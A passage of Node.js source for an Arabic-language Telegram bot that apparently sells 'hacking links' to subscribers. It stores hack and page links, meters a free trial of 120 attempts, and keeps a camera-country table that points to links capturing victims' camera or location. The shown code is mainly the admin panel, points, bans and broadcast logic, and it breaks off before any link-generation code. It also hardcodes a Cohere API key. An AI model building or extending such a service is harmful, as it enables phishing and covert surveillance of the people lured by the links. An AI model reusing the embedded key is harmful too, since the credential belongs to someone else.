const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const useragent = require('useragent');
const TinyURL = require('tinyurl');
const axios = require('axios');
const os = require('os');
const https = require('https');
const googleTTS = require('google-tts-api');
require('dotenv').config();  
const cheerio = require("cheerio");
const {
  Readable
} = require("stream");
    
const {
  DateTime,
  Duration
} = require("luxon");

const sqlite3 = require('sqlite3').verbose();

let db;

function initializeDatabase() {
  return new Promise((resolve, reject) => {
    const dbPath = path.join(__dirname, 'botData.db');
    db = new sqlite3.Database(dbPath, (err) => {
      if (err) {
        console.error('خطأ في فتح قاعدة البيانات:', err.message);
        return reject(err);
      }
      console.log('تم الاتصال بقاعدة البيانات بنجاح');
      db.run(`CREATE TABLE IF NOT EXISTS data (
        key TEXT PRIMARY KEY,
        value TEXT
      )`, (err) => {
        if (err) {
          console.error('خطأ في إنشاء الجدول:', err.message);
          return reject(err);
        }
        console.log('تم إنشاء الجدول بنجاح');
        resolve();
      });
    });
  });
}

function saveData(key, value) {
  return new Promise((resolve, reject) => {
    db.run(`REPLACE INTO data (key, value) VALUES (?, ?)`, [key, JSON.stringify(value)], (err) => {
      if (err) {
        console.error('خطأ في حفظ البيانات:', err.message);
        return reject(err);
      }
      console.log(`تم حفظ البيانات بنجاح للعنصر: ${key} بالقيمة: ${JSON.stringify(value)}`);
      resolve();
    });
  });
}

function loadData(key) {
  return new Promise((resolve, reject) => {
    db.get(`SELECT value FROM data WHERE key = ?`, [key], (err, row) => {
      if (err) {
        console.error('خطأ في تحميل البيانات:', err.message);
        return reject(err);
      }
      if (row) {
        console.log(`تم تحميل البيانات بنجاح للعنصر: ${key}`);
        resolve(JSON.parse(row.value));
      } else {
        console.log(`لم يتم العثور على البيانات للعنصر: ${key}`);
        resolve(null);
      }
    });
  });
}

async function initializeDefaultData() {
  userVisits = await loadData('userVisits') || {};
  platformVisits = await loadData('platformVisits') || {};
  allUsers = new Map(await loadData('allUsers') || []);
  activatedUsers = new Set(await loadData('activatedUsers') || []);
  bannedUsers = new Map(await loadData('bannedUsers') || []);
  subscribedUsers = new Set(await loadData('subscribedUsers') || []);
  userPoints = new Map(await loadData('userPoints') || []);
  userReferrals = new Map(await loadData('userReferrals') || []);
  usedReferralLinks = new Map(await loadData('usedReferralLinks') || []);
  pointsRequiredForSubscription = (await loadData('pointsRequiredForSubscription')) || 15;
  await loadPageLinks();
  await loadHackLinks();
  
}
async function saveAllData() {
  try {
    await saveData('userVisits', userVisits);
    await saveData('platformVisits', platformVisits);
    await saveData('allUsers', Array.from(allUsers));
    await saveData('activatedUsers', Array.from(activatedUsers));
    await saveData('bannedUsers', Array.from(bannedUsers));
    await saveData('subscribedUsers', Array.from(subscribedUsers));
    await saveData('userPoints', Array.from(userPoints));
    await saveData('userReferrals', Array.from(userReferrals));
    await saveData('usedReferralLinks', Array.from(usedReferralLinks));
    await saveData('pointsRequiredForSubscription', pointsRequiredForSubscription);
    
    // ✅ حفظ روابط الاختراق (/ss)
    await saveData('hackLinks', hackLinks);
    
    // ✅ حفظ روابط الصفحات (/ee) 
    await saveData('pageLinks', pageLinks);
    
    console.log('✅ تم حفظ جميع البيانات بنجاح');
  } catch (error) {
    console.error('❌ خطأ أثناء حفظ جميع البيانات:', error.message);
  }
}
initializeDatabase().then(() => {
  return initializeDefaultData();
}).then(() => {
  console.log('تم تحميل البيانات وبدء تشغيل البوت');
 
}).catch(error => {
  console.error('حدث خطأ أثناء تحميل البيانات:', error.message);
  process.exit(1);
});

setInterval(() => {
  saveAllData().catch(error => console.error('فشل في الحفظ الدوري للبيانات:', error.message));
}, 5 * 60 * 1000);

process.on('SIGINT', async () => {
  console.log('تم استلام إشارة إيقاف، جاري حفظ البيانات...');
  try {
    await saveAllData();
    console.log('تم حفظ البيانات بنجاح. إيقاف البوت...');
    db.close((err) => {
      if (err) {
        console.error('خطأ في إغلاق قاعدة البيانات:', err.message);
        process.exit(1);
      }
      console.log('تم إغلاق قاعدة البيانات بنجاح.');
      process.exit(0);
    });
  } catch (error) {
    console.error('فشل في حفظ البيانات قبل الإيقاف:', error.message);
    process.exit(1);
  }
});

function verifyData() {
  const dbPath = path.join(__dirname, 'botData.db');
  const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
      return console.error('خطأ في فتح قاعدة البيانات:', err.message);
    }
    console.log('تم الاتصال بقاعدة البيانات بنجاح');

    db.all(`SELECT key, value FROM data`, [], (err, rows) => {
      if (err) {
        return console.error('خطأ في استعلام البيانات:', err.message);
      }
      console.log('البيانات في قاعدة البيانات:');
      rows.forEach((row) => {
        console.log(`${row.key}: ${row.value}`);
      });

      db.close((err) => {
        if (err) {
          return console.error('خطأ في إغلاق قاعدة البيانات:', err.message);
        }
        console.log('تم إغلاق قاعدة البيانات بنجاح.');
      });
    });
  });
}
setTimeout(verifyData, 10000); 
const fs = require('fs');
const videosDir = path.join(__dirname, 'videos');
if (!fs.existsSync(videosDir)) {
    fs.mkdirSync(videosDir);
}

const token = process.env.s; 
const bot = new TelegramBot(token, { polling: true });

const users = new Set();

bot.on('message', (msg) => {
  users.add(msg.from.id);
});

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(path.join(__dirname, 'uploads')));
const storage = multer.memoryStorage();
const upload = multer({ storage: multer.memoryStorage() });

const MAX_FREE_ATTEMPTS = 120;
const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت";

const admins = ['7130416076', '5823913363', '6808883615']; 
function isAdmin(userId) {
  return admins.includes(userId.toString()); 
}

function addPointsToUser(userId, points) {
  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  checkSubscriptionStatus(userId);
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error));
  return user.points;
}

function deductPointsFromUser(userId, points) {
  if (!allUsers.has(userId)) {
    return false;
  }
  const user = allUsers.get(userId);
  if ((user.points || 0) >= points) {
    user.points -= points;
    userPoints.set(userId, user.points);
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); 
    return true;
  }
  return false;
}


function banUser(userId) {
  bannedUsers.set(userId.toString(), true);
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error));
}

function unbanUser(userId) {
  const result = bannedUsers.delete(userId.toString());
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error));
  return result;
}

function broadcastMessage(message) {
  allUsers.forEach((user, userId) => {
    bot.sendMessage(userId, message).catch(error => {
      console.error(`Error sending message to ${userId}:`, error.message);
    });
  });
}


function createAdminKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'حظر مستخدم', callback_data: 'ban' }],
        [{ text: 'إلغاء حظر مستخدم', callback_data:'unban' }],
        [{ text: 'عرض الإحصائيات', callback_data:'stats' }],
        [{ text: 'إرسال رسالة', callback_data:'broadcast' }],
        [{ text: 'قائمة المحظورين', callback_data:'abo' }],
        [{ text: 'إضافة نقاط', callback_data: 'addpoints' }],
        [{ text: 'خصم نقاط', callback_data:'deductpoints' }],
        [{ text: 'تعيين نقاط الاشتراك', callback_data: 'setsubscriptionpoints' }],
        [{ text: 'الاشتراك', callback_data:'subscribe' }],
        [{ text: 'إلغاء الاشتراك', callback_data:'unsubscribe' }],
        [{ text: 'إلغاء اشتراك جميع المستخدمين', callback_data:'unsubscribe_all' }],
        [{ text: 'إضافة اشتراك لجميع المستخدمين ', callback_data:'subscribe_all' }],
        [{ text: 'عرض المشتركين', callback_data:'listsubscribers' }],
        [{ text: 'إرسال نقاط للجميع', callback_data:'send_points_to_all' }],
        [{ text: 'خصم نقاط من الجميع', callback_data:'deduct_points_from_all' }],
        [{ text: 'حظر جميع المستخدمين', callback_data: 'ban_all_users' }],
        [{ text: 'إلغاء حظر جميع المستخدمين', callback_data:'unban_all_users' }],
      ]
    }
  };
}

bot.onText(/\/admin/, (msg) => {
  if (isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'مرحبًا بك في لوحة تحكم المسؤول:', createAdminKeyboard());
  } else {
     bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
  }
});

bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const userId = callbackQuery.from.id;
  const chatId = msg.chat.id;
  const data = callbackQuery.data;

  if (!isAdmin(userId)) {
    await bot.answerCallbackQuery(callbackQuery.id, 'تم أنشأ ورسال الرابط بنجاح .');
    return;
  }

  switch (data) {
    case 'ban':
      bot.sendMessage(chatId, 'يرجى إدخال معرف المستخدم المراد حظره:');
      bot.once('message', async (response) => {
        const userIdToBan = response.text;
        banUser(userIdToBan);
        bot.sendMessage(chatId, `تم حظر المستخدم ${userIdToBan}`);
        bot.sendMessage(userIdToBan, 'تم حظرك من استخدام هذا البوت. تواصل مع المسؤول إذا كنت تعتقد أن هذا خطأ.');
      });
      break;

    case 'unban':
      bot.sendMessage(chatId, 'يرجى إدخال معرف المستخدم المراد إلغاء حظره:');
      bot.once('message', async (response) => {
        const userIdToUnban = response.text;
        if (unbanUser(userIdToUnban)) {
          bot.sendMessage(chatId, `تم إلغاء حظر المستخدم ${userIdToUnban}`);
          bot.sendMessage(userIdToUnban, 'تم إلغاء حظرك. يمكنك الآن استخدام البوت مرة أخرى.');
        } else {
          bot.sendMessage(chatId, `المستخدم ${userIdToUnban} غير محظور.`);
        }
      });
      break;
    case 'banned_users':
  const bannedList = Array.from(bannedUsers).join(', ');
  bot.sendMessage(chatId, `قائمة المستخدمين المحظورين:\n${bannedList || 'لا يوجد مستخدمين محظورين حاليًا'}`);
  break;
    case 'addpoints':
  bot.sendMessage(chatId, 'أدخل معرف المستخدم وعدد النقاط التي تريد إضافتها (مثال: 123456789 10)');
  bot.once('message', async (response) => {
    const [userId, points] = response.text.split(' ');
    const pointsToAdd = parseInt(points);
    if (!userId || isNaN(pointsToAdd)) {
      bot.sendMessage(chatId, 'عذرًا، الرجاء إدخال المعلومات بالشكل الصحيح.');
      return;
    }
    const newPoints = addPointsToUser(userId, pointsToAdd);
    bot.sendMessage(chatId, `تمت إضافة ${pointsToAdd} نقطة للمستخدم ${userId}. رصيده الحالي: ${newPoints} نقطة.`);
    bot.sendMessage(userId, `تمت إضافة ${pointsToAdd} نقطة إلى رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
  });
  break;
    case 'deductpoints':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم وعدد النقاط التي تريد خصمها (مثال: 123456789 10)');
      bot.once('message', async (response) => {
        const [userId, points] = response.text.split(' ');
        const pointsToDeduct = parseInt(points);
        if (!userId || isNaN(pointsToDeduct)) {
          bot.sendMessage(chatId, 'عذرًا، الرجاء إدخال المعلومات بالشكل الصحيح.');
          return;
        }
        if (deductPointsFromUser(userId, pointsToDeduct)) {
          const newPoints = userPoints.get(userId) || 0;
          bot.sendMessage(chatId, `تم خصم ${pointsToDeduct} نقطة من المستخدم ${userId}. رصيده الحالي: ${newPoints} نقطة.`);
          bot.sendMessage(userId, `تم خصم ${pointsToDeduct} نقطة من رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
        } else {
          bot.sendMessage(chatId, `عذرًا، المستخدم ${userId} لا يملك نقاطًا كافية للخصم.`);
        }
      });
      break;
    case 'setsubscriptionpoints':
      bot.sendMessage(chatId, 'أدخل عدد النقاط المطلوبة للاشتراك:');
      bot.once('message', async (response) => {
        pointsRequiredForSubscription = parseInt(response.text);
        bot.sendMessage(chatId, `تم تعيين عدد النقاط المطلوبة للاشتراك إلى ${pointsRequiredForSubscription}`);
      });
      break;
    case 'subscribe':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد إضافته للمشتركين:');
      bot.once('message', async (response) => {
        const userIdToSubscribe = response.text;
        if (subscribeUser(userIdToSubscribe)) {
          bot.sendMessage(chatId, `تم اشتراك المستخدم ${userIdToSubscribe} بنجاح.`);
        } else {
          bot.sendMessage(chatId, `المستخدم ${userIdToSubscribe} مشترك بالفعل.`);
        }
      });
      break;

    case 'unsubscribe':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد إلغاء اشتراكه:');
      bot.once('message', async (response) => {
        const userIdToUnsubscribe = response.text;
        if (unsubscribeUser(userIdToUnsubscribe)) {
          bot.sendMessage(chatId, `تم إلغاء اشتراك المستخدم ${userIdToUnsubscribe} بنجاح.`);
        } else {
          bot.sendMessage(chatId, `المستخدم ${userIdToUnsubscribe} غير مشترك أصلاً.`);
        }
      });
      break;
    case 'listsubscribers':
      const subscribersList = Array.from(subscribedUsers).join('\n');
      bot.sendMessage(chatId, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
      break;
    case 'send_points_to_all':
  bot.sendMessage(chatId, 'أدخل عدد النقاط التي تريد إرسالها لجميع المستخدمين:');
  bot.once('message', async (msg) => {
    const points = parseInt(msg.text);
    if (!isNaN(points) && points > 0) {
      for (const [userId, user] of allUsers) {
        addPointsToUser(userId, points);
      }
      await bot.sendMessage(chatId, `تم إرسال ${points} نقطة لجميع المستخدمين.`);
    } else {
      await bot.sendMessage(chatId, 'الرجاء إدخال عدد صحيح موجب من النقاط.');
    }
  });
  break;
    case 'deduct_points_from_all':
  bot.sendMessage(chatId, 'أدخل عدد النقاط التي تريد خصمها من جميع المستخدمين:');
  bot.once('message', async (msg) => {
    const points = parseInt(msg.text);
    if (!isNaN(points) && points > 0) {
      for (const [userId, user] of allUsers) {
        deductPointsFromUser(userId, points);
      }
      await bot.sendMessage(chatId, `تم خصم ${points} نقطة من جميع المستخدمين.`);
    } else {
      await bot.sendMessage(chatId, 'الرجاء إدخال عدد صحيح موجب من النقاط.');
    }
  });
  break;
  case 'unsubscribe_all':
      const unsubscribedCount = subscribedUsers.size;
      subscribedUsers.clear();
      await bot.sendMessage(chatId, `تم إلغاء اشتراك جميع المستخدمين. تم إلغاء اشتراك ${unsubscribedCount} مستخدم.`);
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إلغاء اشتراك الجميع
      break;

      case 'subscribe_all':
      let subscribedCount = 0;
      for (const [userId, user] of allUsers) {
        if (!subscribedUsers.has(userId)) {
          subscribedUsers.add(userId);
          subscribedCount++;
          try {
            await bot.sendMessage(userId, 'تم تفعيل اشتراكك في البوت. يمكنك الآن استخدام جميع الميزات.');
          } catch (error) {
            console.error(`فشل في إرسال رسالة للمستخدم ${userId}:`, error);
          }
        }
      }
      await bot.sendMessage(chatId, `تم إضافة اشتراك لـ ${subscribedCount} مستخدم جديد.`);
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد اشتراك الجميع
      break;
     case 'ban_all_users':
      allUsers.forEach((user, userId) => {
        bannedUsers.set(userId, true);
      });
      await bot.sendMessage(chatId, 'تم حظر جميع المستخدمين.');
      broadcastMessage('تم إيقاف استخدام البوت من قبل المطور.');
      break;

    case 'unban_all_users':
      bannedUsers.clear();
      await bot.sendMessage(chatId, 'تم إلغاء حظر جميع المستخدمين.');
      broadcastMessage('تم تشغيل البوت من قبل المطور.');
      break;
                    

  async function broadcastMessage(originalMessage) {
  let totalUsers = 0;
  let successfulSends = 0;
  let blockedUsers = 0;
  let failedSends = 0;
  let usersWhoBlockedBot = 0;
  
  const startTime = Date.now();

  for (const [userId, user] of allUsers.entries()) {
    totalUsers++;
    
    try {
      
      if (bannedUsers.has(userId.toString())) {
        blockedUsers++;
        continue;
      }

      if (user.hasBlockedBot) {
        usersWhoBlockedBot++;
        continue;
      }

      if (originalMessage.photo) {
        await bot.sendPhoto(userId, originalMessage.photo[0].file_id, {
          caption: originalMessage.caption
        });
      } else if (originalMessage.video) {
        await bot.sendVideo(userId, originalMessage.video.file_id, {
          caption: originalMessage.caption
        });
      } else if (originalMessage.document) {
        await bot.sendDocument(userId, originalMessage.document.file_id, {
          caption: originalMessage.caption
        });
      } else if (originalMessage.audio) {
        await bot.sendAudio(userId, originalMessage.audio.file_id, {
          caption: originalMessage.caption
        });
      } else if (originalMessage.voice) {
        await bot.sendVoice(userId, originalMessage.voice.file_id);
      } else if (originalMessage.text) {
        await bot.sendMessage(userId, originalMessage.text);
      }
      
      successfulSends++;
      
     
      await new Promise(resolve => setTimeout(resolve, 100));
      
    } catch (error) {
      failedSends++;
      console.error(`فشل إرسال الرسالة للمستخدم ${userId}:`, error.message);
      
      if (error.code === 403) {
        user.hasBlockedBot = true;
        usersWhoBlockedBot++;
      }
    }
  }

  const endTime = Date.now();
  const duration = (endTime - startTime) / 1000;

  const broadcastStats = `
📊 إحصائيات الإذاعة:
━━━━━━━━━━━━━
• إجمالي المستخدمين: ${totalUsers} 👥
• تم الإرسال بنجاح: ${successfulSends} ✅
• المستخدمين المحظورين: ${blockedUsers} 🚫
• حظروا البوت: ${usersWhoBlockedBot} ⛔
• فشل الإرسال: ${failedSends} ❌
• نسبة النجاح: ${((successfulSends / totalUsers) * 100).toFixed(2)}% 📈
• وقت التنفيذ: ${duration.toFixed(2)} ثانية ⏱
━━━━━━━━━━━━━
`;

  return broadcastStats;
}


 
    case 'broadcast':
      // رسالة الانتظار
      const waitMessage = await bot.sendMessage(
        chatId, 
        'قم بإرسال رسالتك الآن (نص، صورة، فيديو، أو أي نوع آخر) وسيتم إعادة توجيهها للجميع ⏳'
      );
      
      
      const messageHandler = async (response) => {
        try {
         
          await bot.editMessageText(
            'جاري تنفيذ الإذاعة... ⏳',
            {
              chat_id: chatId,
              message_id: waitMessage.message_id
            }
          );
          
          const broadcastStats = await broadcastMessage(response);
          
       
          await bot.editMessageText(
            'تم تنفيذ الإذاعة بنجاح ✅\n\n' + broadcastStats,
            {
              chat_id: chatId,
              message_id: waitMessage.message_id
            }
          );
        } catch (error) {
          console.error('خطأ في الإذاعة:', error);
          await bot.editMessageText(
            'حدث خطأ أثناء تنفيذ الإذاعة ❌\nالرجاء المحاولة مرة أخرى.',
            {
              chat_id: chatId,
              message_id: waitMessage.message_id
            }
          );
        }
        
        bot.removeListener('message', messageHandler);
      };

      bot.once('message', messageHandler);
      break;
  }
  
  await bot.answerCallbackQuery(callbackQuery.id);
});

bot.on('some_event', (msg) => {
  sendBotStats(msg.chat.id);
});

function recordBanAction(userId, adminId) {
  const adminName = getUsername(adminId);
  bannedUsers.set(userId, adminName);
}

function getUsername(userId) {
  return allUsers.get(userId)?.username || 'Unknown';
}

function updateUserBlockStatus(userId, hasBlocked) {
  if (allUsers.has(userId)) {
    allUsers.get(userId).hasBlockedBot = hasBlocked;
  } else {
    allUsers.set(userId, { hasBlockedBot: hasBlocked });
  }
}

bot.on('left_chat_member', (msg) => {
  const userId = msg.left_chat_member.id;
  if (!msg.left_chat_member.is_bot) {
    updateUserBlockStatus(userId, true);
  }
});

bot.on('my_chat_member', (msg) => {
  if (msg.new_chat_member.status === 'kicked' || msg.new_chat_member.status === 'left') {
    const userId = msg.from.id;
    updateUserBlockStatus(userId, true);
  }
});

function isUserBlocked(userId) {
  return allUsers.get(userId)?.hasBlockedBot || false;
}

function sendBotStats(chatId) {
  const totalUsers = allUsers.size;
  const activeUsers = activatedUsers.size;
  const bannedUsersCount = bannedUsers.size;
  const usersWhoBlockedBot = Array.from(allUsers.values()).filter(user => user.hasBlockedBot).length;

  bot.sendMessage(chatId, `إحصائيات البوت:\nعدد المستخدمين الكلي: ${totalUsers}\nعدد المستخدمين النشطين: ${activeUsers}\nعدد المستخدمين المحظورين: ${bannedUsersCount}\nعدد المستخدمين الذين حظروا البوت: ${usersWhoBlockedBot}`);
}

function hasUserBlockedBefore(userId) {
  return allUsers.has(userId) && allUsers.get(userId).hasBlockedBot;
}

bot.on('message', (msg) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;

  if (isUserBlocked(userId)) {
    bot.sendMessage(chatId, 'لقد تم حظرك من استخدام البوت لأنك قمت بحذفه وحظره.', {
      reply_markup: {
        remove_keyboard: true,
      },
    });
    return;
  }

 
});

bot.on('callback_query', (query) => {
  const userId = query.from.id;
  const chatId = query.message.chat.id;
  const data = query.data;

  if (isUserBlocked(userId)) {
    bot.answerCallbackQuery(query.id, { text: 'لقد تم حظرك من استخدام البوت لأنك قمت بحذفه وحظره.', show_alert: true });
    return;
  }

  switch (data) {
    case 'stats':
      sendBotStats(chatId);
      break;

    
  }
});

const COHERE_API_KEY = 'bl4hkm8ZCE35k2oz12uM3pkIFnSL29TNX3GMih3U'; 

async function getLoveMessage(chatId) {
    const loveMessage = `قم بكتابة رسالة رسمية باللغة العربية لفريق دعم واتساب لفك الحظر عن رقمي. يجب أن تكون الرسالة:

    1- رسمية ومحترفة ومقنعة
    2- تظهر الندم والاعتذار عن أي خطأ غير مقصود
    3- تشرح أهمية الحساب للعمل والتواصل مع العائلة
    4- تتضمن تعهداً واضحاً بالالتزام بالقواعد
    5- تكون العاطفة فيها معتدلة ومقنعة
    6- تكون مرتبة ومنسقة بشكل جيد
    7- لا تتجاوز 600 حرف لضمان وصولها كاملة

    اكتب الرسالة بأسلوب مباشر ومؤثر.`;

    try {
        const response = await axios.post('https://api.cohere.ai/v1/generate', { // تحديد إصدار API
            model: 'command-xlarge-nightly', 
            prompt: loveMessage,
            max_tokens: 600,
            temperature: 0.8
        }, {
            headers: {
                'Authorization': `Bearer ${COHERE_API_KEY}`,
                'Content-Type': 'application/json'
            }
        });

        if (response.data && response.data.generations && response.data.generations.length > 0) {
            const generatedText = response.data.generations[0].text;
            bot.sendMessage(chatId, generatedText);
        } else {
            console.error('Unexpected response format:', response.data);
            bot.sendMessage(chatId, 'لم أتمكن من جلب الرسالة، الرجاء المحاولة لاحقًا.');
        }
    } catch (error) {
        console.error('Error fetching love message:', error.response ? error.response.data : error.message);
        bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب الرسالة. الرجاء المحاولة مرة أخرى لاحقًا.');
    }
}

async function getJoke(chatId) {
    try {
        const userMessage = 'اعطيني نكته يمنيه قصيره جداً بلهجه اليمنيه الاصيله🤣🤣🤣🤣';

        const payload = JSON.stringify({
            contents: [
                {
                    role: 'user',
                    content: userMessage
                }
            ]
        });

        const response = await axios.post('http://pass-gpt.nowtechai.com/api/v1/pass', payload, {
            headers: {
                'User-Agent': 'Ktor client',
                'Connection': 'Keep-Alive',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json'
            },
            responseType: 'stream' // التعامل مع البيانات على شكل Stream
        });

        let fullContent = ''; // متغير لتخزين الرد الكامل
        response.data.on('data', (chunk) => {
            try {
                const parsedChunk = JSON.parse(chunk.toString());
                if (parsedChunk && parsedChunk.content) {
                    fullContent += parsedChunk.content; // إضافة كل جزء من الرد إلى المتغير
                }
            } catch (err) {
                console.error('Error parsing chunk:', err.message);
            }
        });

        response.data.on('end', () => {
            if (fullContent.trim()) {
                bot.sendMessage(chatId, fullContent.trim()); // إرسال الرد الكامل إلى المستخدم
            } else {
                bot.sendMessage(chatId, 'لم أتمكن من جلب النكتة، الرجاء المحاولة لاحقًا.');
            }
        });

        response.data.on('error', (err) => {
            console.error('Error in stream:', err.message);
            bot.sendMessage(chatId, 'حدث خطأ أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا.');
        });
    } catch (error) {
        console.error('Error fetching joke:', error.response?.data || error.message);
        bot.sendMessage(chatId, 'حدث خطأ أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا.');
    }
}

const cameraCountryTranslation = {
   "AF": "أفغانستان 🇦🇫",
   "AL": "ألبانيا 🇦🇱",
   "DZ": "الجزائر 🇩🇿",
   "AO": "أنغولا 🇦🇴",
   "AR": "الأرجنتين 🇦🇷",
  "AM": "أرمينيا 🇦🇲",
  "AU": "أستراليا 🇦🇺",
  "AT": "النمسا 🇦🇹",
  "AZ": "أذربيجان 🇦🇿",
  "BH": "البحرين 🇧🇭",
  "BD": "بنغلاديش 🇧🇩",
  "BY": "بيلاروس 🇧🇾",
  "BE": "بلجيكا 🇧🇪",
  "BZ": "بليز 🇧🇿",
  "BJ": "بنين 🇧🇯",
  "BO": "بوليفيا 🇧🇴",
  "BA": "البوسنة والهرسك 🇧🇦",
  "BW": "بوتسوانا 🇧🇼",
  "BR": "البرازيل 🇧🇷",
  "BG": "بلغاريا 🇧🇬",
  "BF": "بوركينا فاسو 🇧ﺫ",
  "KH": "كمبوديا 🇰🇭",
  "CM": "الكاميرون 🇨🇲",
  "CA": "كندا 🇨🇦",
  "CL": "تشيلي 🇨🇱",
  "CN": "الصين 🇨🇳",
  "CO": "كولومبيا 🇨🇴",
  "CR": "كوستاريكا 🇨🇷",
  "HR": "كرواتيا 🇭🇷",
  "CY": "قبرص 🇨🇾",
  "CZ": "التشيك 🇨🇿",
  "DK": "الدنمارك 🇩🇰",
  "EC": "الإكوادور 🇪🇨",
  "EG": "مصر 🇪🇬",
  "SV": "السلفادور 🇸🇻",
  "EE": "إستونيا 🇪🇪",
  "ET": "إثيوبيا 🇪🇹",
  "FI": "فنلندا 🇫🇮",
  "FR": "فرنسا 🇫🇷",
  "GE": "جورجيا 🇬🇪",
  "DE": "ألمانيا 🇩🇪",
  "GH": "غانا 🇬🇭",
  "GR": "اليونان 🇬🇷",
  "GT": "غواتيمالا 🇬🇹",
  "HN": "هندوراس 🇭🇳",
  "HK": "هونغ كونغ 🇭🇰",
  "HU": "المجر 🇭🇺",
  "IS": "آيسلندا 🇮🇸",
  "IN": "الهند 🇮🇳",
  "ID": "إندونيسيا 🇮🇩",
  "IR": "إيران 🇮🇷",
  "IQ": "العراق 🇮🇶",
  "IE": "أيرلندا 🇮🇪",
  "IL": " المحتله 🇮🇱",
  "IT": "إيطاليا 🇮🇹",
  "CI": "ساحل العاج 🇨🇮",
  "JP": "اليابان 🇯🇵",
  "JO": "الأردن 🇯🇴",
  "KZ": "كازاخستان 🇰🇿",
  "KE": "كينيا 🇰🇪",
  "KW": "الكويت 🇰🇼",
  "KG": "قيرغيزستان 🇰🇬",
  "LV": "لاتفيا 🇱🇻",
  "LB": "لبنان 🇱🇧",
  "LY": "ليبيا 🇱🇾",
  "LT": "ليتوانيا 🇱🇹",
  "LU": "لوكسمبورغ 🇱🇺",
  "MO": "ماكاو 🇲🇴",
  "MY": "ماليزيا 🇲🇾",
  "ML": "مالي 🇲🇱",
  "MT": "مالطا 🇲🇹",
  "MX": "المكسيك 🇲🇽",
  "MC": "موناكو 🇲🇨",
  "MN": "منغوليا 🇲🇳",
  "ME": "الجبل الأسود 🇲🇪",
  "MA": "المغرب 🇲🇦",
  "MZ": "موزمبيق 🇲🇿",
  "MM": "ميانمار 🇲🇲",
  "NA": "ناميبيا 🇳🇦",
  "NP": "نيبال 🇳🇵",
  "NL": "هولندا 🇳🇱",
  "NZ": "نيوزيلندا 🇳🇿",
  "NG": "نيجيريا 🇳🇬",
  "KP": "كوريا الشمالية 🇰🇵",
  "NO": "النرويج 🇳🇴",
  "OM": "عمان 🇴🇲",
  "PK": "باكستان 🇵🇰",
  "PS": "فلسطين 🇵🇸",
  "PA": "بنما 🇵🇦",
  "PY": "باراغواي 🇵🇾",
  "PE": "بيرو 🇵🇪",
  "PH": "الفلبين 🇵🇭",
  "PL": "بولندا 🇵🇱",
  "PT": "البرتغال 🇵🇹",
  "PR": "بورتوريكو 🇵🇷",
  "QA": "قطر 🇶🇦",
  "RO": "رومانيا 🇷🇴",
  "RU": "روسيا 🇷🇺",
  "RW": "رواندا 🇷🇼",
  "SA": "السعودية 🇸🇦",
  "SN": "السنغال 🇸🇳",
  "RS": "صربيا 🇷🇸",
  "SG": "سنغافورة 🇸🇬",
  "SK": "سلوفاكيا 🇸🇰",
  "SI": "سلوفينيا 🇸🇮",
  "ZA": "جنوب أفريقيا 🇿🇦",
  "KR": "كوريا الجنوبية 🇰🇷",
  "ES": "إسبانيا 🇪🇸",
  "LK": "سريلانكا 🇱🇰",
  "SD": "السودان 🇸🇩",
  "SE": "السويد 🇸🇪",
  "CH": "سويسرا 🇨🇭",
  "SY": "سوريا 🇸🇾",
  "TW": "تايوان 🇹🇼",
  "TZ": "تنزانيا 🇹🇿",
  "TH": "تايلاند 🇹🇭",
  "TG": "توغو 🇹🇬",
  "TN": "تونس 🇹🇳",
  "TR": "تركيا 🇹🇷",
  "TM": "تركمانستان 🇹🇲",
  "UG": "أوغندا 🇺🇬",
  "UA": "أوكرانيا 🇺🇦",
  "AE": "الإمارات 🇦🇪",
  "GB": "بريطانيا 🇬🇧",
  "US": "امريكا 🇺🇸",
  "UY": "أوروغواي 🇺🇾",
  "UZ": "أوزبكستان 🇺🇿",
  "VE": "فنزويلا 🇻🇪",
  "VN": "فيتنام 🇻🇳",
  "ZM": "زامبيا 🇿🇲",
  "ZW": "زيمبابوي 🇿🇼",
  "GL": "غرينلاند 🇬🇱",
  "KY": "جزر كايمان 🇰🇾",
  "NI": "نيكاراغوا 🇳🇮",
  "DO": "الدومينيكان 🇩🇴",
  "NC": "كاليدونيا 🇳🇨",
  "LA": "لاوس 🇱🇦",
  "TT": "ترينيداد وتوباغو 🇹🇹",
  "GG": "غيرنزي 🇬🇬",
  "GU": "غوام 🇬🇺",
  "GP": "غوادلوب 🇬🇵",
  "MG": "مدغشقر 🇲🇬",
  "RE": "ريونيون 🇷🇪",
  "FO": "جزر فارو 🇫🇴",
  "MD": "مولدوفا 🇲🇩" 
};
  
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data; 
